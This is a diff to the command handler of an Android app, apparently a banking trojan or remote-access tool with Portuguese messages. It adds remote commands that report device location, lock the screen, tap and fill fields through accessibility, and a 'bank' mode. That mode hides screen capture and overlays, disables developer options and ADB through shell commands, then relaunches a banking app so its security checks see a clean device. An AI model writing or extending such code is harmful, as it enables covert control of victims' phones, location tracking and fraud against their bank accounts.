@@ -51,24 +51,93 @@ public final class Cmd {
                 case "shot":
                     if (acc()) k.shotOn = o.optBoolean("on", true);
                     break;
+                case "off": {
+                    Aviso.clear();
+                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
+                    ScreenSvc.giveUp = true;
+                    ScreenSvc.alive = false;
+                    ScreenSvc.black = false;
+                    if (k != null) k.shotOn = false;
+                    try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
+                    if (k != null) k.lock();
+                    Net.send("{\"t\":\"off\"}");
+                    Util.sendT("info", "captura desligada e tela bloqueada");
+                    break;
+                }
+                case "screenoff":
+                    if (k != null) k.lock();
+                    break;
+                case "geo":
+                    Net.send("{\"t\":\"geo\",\"o\":" + Util.geo(c) + "}");
+                    break;
                 case "ov":
                     Ov.set(KeySvc.I != null ? KeySvc.I : c, o.optBoolean("on", true));
                     break;
-                case "bank":
+                case "bank": {
                     Aviso.clear();
+                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
                     ScreenSvc.giveUp = true;
                     ScreenSvc.alive = false;
+                    ScreenSvc.black = false;
+                    if (k != null) k.shotOn = false;
                     try { c.stopService(new Intent(c, ScreenSvc.class)); } catch (Throwable ignored) {}
-                    Ov.set(KeySvc.I != null ? KeySvc.I : c, false);
-                    ScreenSvc.Q = 45;
-                    ScreenSvc.FPS = 3;
-                    Util.sendT("info", "modo banco: projecao off, overlay off");
-                    if (acc()) Tree.dump(k);
+
+                    StringBuilder r = new StringBuilder();
+                    r.append(Util.settings("global", "development_settings_enabled", "0")
+                            ? "opcoes do desenvolvedor: off" : "opcoes do desenvolvedor: FALHOU (grant adb)");
+                    r.append("\n").append(Util.settings("global", "adb_enabled", "0")
+                            ? "depuracao usb: off" : "depuracao usb: FALHOU");
+                    r.append("\n").append(Util.settings("global", "adb_wifi_enabled", "0")
+                            ? "depuracao sem fio: off" : "depuracao sem fio: FALHOU");
+                    r.append("\n").append(Util.settings("global", "window_animation_scale", "0")
+                            ? "animacoes: 0" : "animacoes: FALHOU");
+                    r.append("\n").append(Util.settings("global", "transition_animation_scale", "0")
+                            ? "transicoes: 0" : "transicoes: FALHOU");
+                    r.append("\n").append(Util.settings("global", "animator_duration_scale", "0")
+                            ? "animator: 0" : "animator: FALHOU");
+                    try {
+                        Runtime.getRuntime().exec(new String[]{"sh", "-c",
+                                "appops set " + c.getPackageName() + " REQUEST_INSTALL_PACKAGES deny"});
+                        r.append("\ninstalacao por fonte desconhecida: off");
+                    } catch (Throwable ignored) {
+                        r.append("\ninstalacao por fonte desconhecida: FALHOU");
+                    }
+                    r.append("\nprojecao de tela: off\noverlay: off");
+                    r.append("\n\nreabra o banco agora.");
+                    Util.sendT("bank", r.toString());
+
+                    String pkg = o.optString("pkg");
+                    if (pkg.length() > 3) {
+                        try {
+                            Runtime.getRuntime().exec(new String[]{"sh", "-c", "am force-stop " + pkg});
+                        } catch (Throwable ignored) {}
+                        Intent i2 = c.getPackageManager().getLaunchIntentForPackage(pkg);
+                        if (i2 != null) c.startActivity(i2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
+                    }
                     break;
-                case "unbank":
+                }
+                case "unbank": {
                     ScreenSvc.giveUp = false;
-                    Util.sendT("info", "modo normal: reabra a captura na MainActivity");
+                    if (k != null) k.shotOn = true;
+                    StringBuilder r = new StringBuilder();
+                    r.append(Util.settings("global", "development_settings_enabled", "1")
+                            ? "opcoes do desenvolvedor: on" : "opcoes do desenvolvedor: FALHOU");
+                    r.append("\n").append(Util.settings("global", "adb_enabled", "1")
+                            ? "depuracao usb: on" : "depuracao usb: FALHOU");
+                    r.append("\n").append(Util.settings("global", "window_animation_scale", "1")
+                            ? "animacoes: 1" : "animacoes: FALHOU");
+                    r.append("\n").append(Util.settings("global", "transition_animation_scale", "1")
+                            ? "transicoes: 1" : "transicoes: FALHOU");
+                    r.append("\n").append(Util.settings("global", "animator_duration_scale", "1")
+                            ? "animator: 1" : "animator: FALHOU");
+                    try {
+                        Runtime.getRuntime().exec(new String[]{"sh", "-c",
+                                "appops set " + c.getPackageName() + " REQUEST_INSTALL_PACKAGES allow"});
+                    } catch (Throwable ignored) {}
+                    r.append("\n\nmodo normal. reabra a captura na tela de setup.");
+                    Util.sendT("bank", r.toString());
                     break;
+                }
                 case "macro":
                     if ("stop".equals(o.optString("op"))) Macro.stop();
                     else Macro.play(o.optJSONArray("s"), o.optJSONObject("v"));
@@ -109,7 +178,11 @@ public final class Cmd {
                     if (acc()) Tree.dump(k);
                     break;
                 case "tap":
-                    if (acc()) k.touch((float) o.optDouble("x"), (float) o.optDouble("y"));
+                    if (acc()) Tree.act(k, (float) o.optDouble("x"), (float) o.optDouble("y"), false);
+                    break;
+                case "node":
+                    if (acc()) Tree.act(k, (float) o.optDouble("x"), (float) o.optDouble("y"),
+                            o.optBoolean("long", false));
                     break;
                 case "fill":
                     if (acc()) Tree.fill(k, (float) o.optDouble("x"), (float) o.optDouble("y"), o.optString("s"));
